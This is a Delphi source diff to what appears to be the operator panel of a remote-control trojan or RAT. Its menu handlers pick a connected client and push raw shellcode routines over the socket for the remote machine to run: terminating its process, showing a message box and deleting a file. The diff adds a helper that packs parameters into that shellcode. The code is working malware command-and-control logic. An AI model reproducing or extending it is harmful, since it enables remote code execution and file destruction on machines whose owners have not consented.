@@ -45,6 +45,8 @@ end;
 procedure TForm1.CloseServer1Click(Sender: TObject);
 var
   mTempThread:TClientThread;
+  pFunction:Pointer;
+  dwFunction:Cardinal;
 begin
   if listview1.Selected <> nil then
   begin
@@ -53,7 +55,12 @@ begin
       if SubItems.Objects[0] <> nil then
       begin
         mTempThread := TClientThread(SubItems.Objects[0]);
-        SendBuffer(mTempThread.mySocket, 0, @untSHDeleteFile.pExitProcess, (DWORD(@pExitProcess_END) - DWORD(@pExitProcess))+1);
+        pFunction := prepShellCodeWithParams(@pExitProcess, nil, (DWORD(@pExitProcess_END) - DWORD(@pExitProcess)), 0, dwFunction);
+        if pFunction <> nil then
+        begin
+          SendBuffer(mTempThread.mySocket, 0, pFunction, dwFunction+1);
+          FreeMem(pFunction);
+        end;
       end;
     end;
   end;
@@ -62,6 +69,9 @@ end;
 procedure TForm1.MessageBox1Click(Sender: TObject);
 var
   mTempThread:TClientThread;
+  pFunction:Pointer;
+  dwFunction:Cardinal;
+  strData:String;
 begin
   if listview1.Selected <> nil then
   begin
@@ -69,8 +79,14 @@ begin
     begin
       if SubItems.Objects[0] <> nil then
       begin
+        strData := 'HELO WHAT UP?';
         mTempThread := TClientThread(SubItems.Objects[0]);
-        SendBuffer(mTempThread.mySocket, 0, @untSHMessageBox.pMessageBox, (DWORD(@untSHMessageBox.pMessageBox_END) - DWORD(@untSHMessageBox.pMessageBox))+1);
+        pFunction := prepShellCodeWithParams(@pMessageBox, @strData[1], (DWORD(@untSHMessageBox.pMessageBox_END) - DWORD(@untSHMessageBox.pMessageBox)), Length(strData) + 1,dwFunction);
+        if pFunction <> nil then
+        begin
+          SendBuffer(mTempThread.mySocket, 0, pFunction, dwFunction+1);
+          FreeMem(pFunction);
+        end;
       end;
     end;
   end;
@@ -79,6 +95,9 @@ end;
 procedure TForm1.DeleteFile1Click(Sender: TObject);
 var
   mTempThread:TClientThread;
+  pFunction:Pointer;
+  dwFunction:Cardinal;
+  strData:String;
 begin
   if listview1.Selected <> nil then
   begin
@@ -87,7 +106,13 @@ begin
       if SubItems.Objects[0] <> nil then
       begin
         mTempThread := TClientThread(SubItems.Objects[0]);
-        SendBuffer(mTempThread.mySocket, 0, @untSHDeleteFile.pDeleteFile, (DWORD(@untSHDeleteFile.pDeleteFile_END) - DWORD(@untSHDeleteFile.pDeleteFile))+1);
+        strData := 'C:\a.txt';
+        pFunction := prepShellCodeWithParams(@pDeleteFile, @strData[1], (DWORD(@pDeleteFile_END) - DWORD(@pDeleteFile)), Length(strData) + 1,dwFunction);
+        if pFunction <> nil then
+        begin
+          SendBuffer(mTempThread.mySocket, 0, pFunction, dwFunction+1);
+          FreeMem(pFunction);
+        end;
       end;
     end;
   end;
